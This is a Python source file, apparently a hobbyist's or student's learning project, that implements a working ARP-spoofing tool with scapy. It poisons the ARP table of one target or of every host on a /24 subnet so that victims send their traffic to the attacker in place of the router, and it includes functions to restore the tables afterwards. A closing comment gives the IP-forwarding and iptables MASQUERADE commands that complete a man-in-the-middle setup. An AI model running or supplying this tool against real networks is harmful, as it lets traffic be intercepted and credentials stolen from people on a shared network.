import sys
import time
import argparse
import threading
#threading for the brute force restore = one thread per IP all blasting at once SUPER QUICK
from scapy.all import ARP, Ether, srp1, sendp, srp


#─── ARGS ─────────────────────────────────────────────────────────────────────
#putting argparse up here so iface is available to ALL functions
parser = argparse.ArgumentParser()
parser.add_argument("spoofed_ip", nargs="?", help="IP to impersonate (usually the router)")
parser.add_argument("target_ip", nargs="?", help="Victim IP (leave out if using --all)")
parser.add_argument("--iface", default="eth1", help="Network interface to use")
parser.add_argument("--restore", action="store_true", help="Restore a single target's ARP table")
parser.add_argument("--all", action="store_true", help="Spoof every device on the subnet")
parser.add_argument("--restore-all", action="store_true", help="Restore every device on the subnet")
args = parser.parse_args()

iface = args.iface
#pulled out into a variable sonot typing args.iface everywhere
# ──────────────────────────────────────────────────────────────────────────────


def get_mac(ip):
    #send a broadcast ARP asking "who has this IP tell me your MAC"
    #srp1 (send recieve packets) sends and gets the first reply alot cleaner than srp for single targets
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    resp = srp1(pkt, timeout=0.5, iface=iface, verbose=False)
    return resp[Ether].src if resp else None



def restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac):
    #send a REAL ARP reply to fix the victims poisoned table
    #op=2 means ARP reply (not request)
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        psrc=spoofed_ip,
        hwsrc=spoofed_mac,
        #the REAL mac this time
        pdst=target_ip,
        hwdst=target_mac
    )
    sendp(pkt, iface=iface, count=15, verbose=False)
    #send it a few times to make sure it works


def start_spoofer(spoofed_ip, target_ip):
    #single target spoof
    target_mac = get_mac(target_ip)
    spoofed_mac = get_mac(spoofed_ip)
    #get both MACs first so can restore properly later

    print(f"Target MAC:  {target_mac}")
    print(f"Spoofed MAC: {spoofed_mac}")

    if not target_mac:
        print(f"[-] Could not get MAC for {target_ip} turn it on")
        sys.exit(1)

    print(f"[+] Spoofing {target_ip} = telling them we are {spoofed_ip}")

    try:
        while True:
            #keep blasting fake ARP replies every 2 seconds
            #ARP tables expire so have to keep refreshing the lie
            pkt = Ether(dst=target_mac) / ARP(
                op=2,
                psrc=spoofed_ip,
                #pretending to be the router
                pdst=target_ip,
                hwdst=target_mac
            )
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[+] Spoofing stopped. Restoring ARP table...")
        restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)
        #clean up but only for terminal


def spoof_all(spoofed_ip):
    #spray fake ARP replies at every possible IP on the subnet
    #derived from spoofed_ip so it works on any subnet
    subnet_prefix = '.'.join(spoofed_ip.split('.')[:3]) + '.'
    #e.g. 192.168.56.1 → "192.168.56."

    spoofed_mac = get_mac(spoofed_ip)
    if not spoofed_mac:
        print(f"[-] Could not get MAC for {spoofed_ip}")
        return

    print(f"[+] Spoofing all devices on {subnet_prefix}0/24 as {spoofed_ip}...")

    try:
        while True:
            for i in range(2, 255):
                #skip .0 and .1
                target_ip = subnet_prefix + str(i)
                if target_ip == spoofed_ip:
                    continue
                #dont spoof what we wanna be

                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    psrc=spoofed_ip,
                    pdst=target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                    #broadcast cuz dont know each targets MAC without scanning first
                )
                sendp(pkt, iface=iface, verbose=False)

            time.sleep(2)
            #wait 2 seconds then do it all again to keep the tables poisoned

    except KeyboardInterrupt:
        print("\n[+] Stopping. Restoring ARP tables...")
        for i in range(2, 255):
            target_ip = subnet_prefix + str(i)
            if target_ip == spoofed_ip:
                continue
            target_mac = get_mac(target_ip)
            if target_mac:
                restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)



def brute_force_restore_all(spoofed_ip):
    #instead of asking each device nicely if theyre alive first,
    #just blast restore packets at every IP on the subnet for 10 seconds

    duration = 10

    spoofed_mac = get_mac(spoofed_ip)
    if not spoofed_mac:
        print(f"[-] Could not get MAC for {spoofed_ip}")
        return

    subnet_prefix = '.'.join(spoofed_ip.split('.')[:3]) + '.'
    stop_time = time.time() + duration

    print(f"[+] Brute-force restoring all devices as {spoofed_ip} for {duration} seconds...")

    def restore_loop(ip):
        #each thread handles one IP, gets its MAC then keeps sending restores until times up
        mac = get_mac(ip)
        while time.time() < stop_time:
            if mac:
                restore_arp(ip, mac, spoofed_ip, spoofed_mac)
            time.sleep(1)
            #sleep releases the GIL so other threads can run during the wait

    threads = []
    for i in range(2, 255):
        ip = subnet_prefix + str(i)
        if ip == spoofed_ip:
            continue

        t = threading.Thread(target=restore_loop, args=(ip,))
        #ip, as a tuple — needed for args= to work correctly

        #~250 threads sounds scary but theyre all sleeping most of the time
        #pythons GIL means only one runs at once anyway

        t.start()
        threads.append(t)

    for t in threads:
        t.join()
        #wait for all threads to finish

    print("[+] Restore complete.")



#─── MAIN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":

    if args.restore:
        if not args.spoofed_ip or not args.target_ip:
            print("Usage: python3 spoofer.py --restore <spoofed_ip> <target_ip>")
            sys.exit(1)
        spoofed_mac = get_mac(args.spoofed_ip)
        target_mac  = get_mac(args.target_ip)
        restore_arp(args.target_ip, target_mac, args.spoofed_ip, spoofed_mac)

    elif args.restore_all:
        if not args.spoofed_ip:
            print("Usage: python3 spoofer.py <spoofed_ip> --restore-all")
            sys.exit(1)
        brute_force_restore_all(args.spoofed_ip)

    elif args.all:
        if not args.spoofed_ip:
            print("Usage: python3 spoofer.py <spoofed_ip> --all")
            sys.exit(1)
        spoof_all(args.spoofed_ip)

    else:
        if not args.spoofed_ip or not args.target_ip:
            print("Usage: python3 spoofer.py <spoofed_ip> <target_ip>")
            sys.exit(1)
        start_spoofer(args.spoofed_ip, args.target_ip)



#─── HOW THE MITM FORWARDING WORKS ───────────────────────────────────────────
#once spoofing, the victim sends all traffic to us thinking we're the router
#to actually forward it (so they stay connected) run these first:
#
#   sudo sysctl -w net.ipv4.ip_forward=1
#   sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
#
#ip_forward tells linux to forward packets instead of dropping them
#MASQUERADE rewrites the source IP to ours before sending to the real router
#that way the router replies to us, and we forward back to the victim
#without MASQUERADE the router would reply directly to the victim and skip us entirely
#
#to turn forwarding off when done:
#   sudo sysctl -w net.ipv4.ip_forward=0
# ──────────────────────────────────────────────────────────────────────────────